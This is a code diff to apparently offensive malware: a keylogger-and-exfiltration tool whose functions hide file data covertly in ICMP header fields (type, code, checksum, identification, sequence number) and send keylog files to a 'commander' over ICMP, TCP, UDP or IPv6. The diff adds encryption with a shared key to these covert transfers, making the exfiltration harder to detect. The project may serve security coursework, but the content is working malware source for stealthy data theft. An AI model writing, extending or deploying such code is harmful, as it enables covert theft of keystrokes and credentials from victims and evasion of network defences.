@@ -3442,7 +3512,7 @@ def transfer_file_icmp_type(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -3454,7 +3524,8 @@ def transfer_file_icmp_type(client_sock: socket.socket,
 
 def transfer_file_icmp_code(client_sock: socket.socket,
                             dest_ip: str,
-                            file_path: str):
+                            file_path: str,
+                            shared_key: bytes):
     """
     Hides file data covertly in ICMP headers using the
     code field.
@@ -3471,14 +3542,16 @@ def transfer_file_icmp_code(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -3490,7 +3563,7 @@ def transfer_file_icmp_code(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -3502,7 +3575,8 @@ def transfer_file_icmp_code(client_sock: socket.socket,
 
 def transfer_file_icmp_chksum(client_sock: socket.socket,
                               dest_ip: str,
-                              file_path: str):
+                              file_path: str,
+                              shared_key: bytes):
     """
     Hides file data covertly in ICMP headers using the
     checksum field.
@@ -3519,14 +3593,16 @@ def transfer_file_icmp_chksum(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -3538,7 +3614,7 @@ def transfer_file_icmp_chksum(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -3550,7 +3626,8 @@ def transfer_file_icmp_chksum(client_sock: socket.socket,
 
 def transfer_file_icmp_identification(client_sock: socket.socket,
                                       dest_ip: str,
-                                      file_path: str):
+                                      file_path: str,
+                                      shared_key: bytes):
     """
     Hides file data covertly in ICMP headers using the
     identification field.
@@ -3567,14 +3644,16 @@ def transfer_file_icmp_identification(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -3586,7 +3665,7 @@ def transfer_file_icmp_identification(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -3598,7 +3677,8 @@ def transfer_file_icmp_identification(client_sock: socket.socket,
 
 def transfer_file_icmp_seq_num(client_sock: socket.socket,
                                dest_ip: str,
-                               file_path: str):
+                               file_path: str,
+                               shared_key: bytes):
     """
     Hides file data covertly in ICMP headers using the
     sequence number field.
@@ -3615,14 +3695,16 @@ def transfer_file_icmp_seq_num(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -3634,7 +3716,7 @@ def transfer_file_icmp_seq_num(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -3833,15 +3915,15 @@ def transfer_keylog_file_covert(sock: socket.socket, dest_ip: str,
 
             # Get IPv6 address and port from commander
             cmdr_ipv6_addr, cmdr_ipv6_port = decrypt_string(sock.recv(1024).decode(), shared_secret).split("/")
-            selected_function(sock, cmdr_ipv6_addr, int(cmdr_ipv6_port), file_path)
+            selected_function(sock, cmdr_ipv6_addr, int(cmdr_ipv6_port), file_path, shared_secret)
 
         # DIFFERENT HANDLERS: TCP or UDP
         elif constants.TCP in choices or constants.UDP in choices:
-            selected_function(sock, dest_ip, dest_port, source_port, file_path)
+            selected_function(sock, dest_ip, dest_port, source_port, file_path, shared_secret)
 
         # DIFFERENT HANDLERS: ICMP
         elif constants.ICMP in choices:
-            selected_function(sock, dest_ip, file_path)
+            selected_function(sock, dest_ip, file_path, shared_secret)
 
         else:
             print(constants.CALL_MAP_FUNCTION_ERROR)
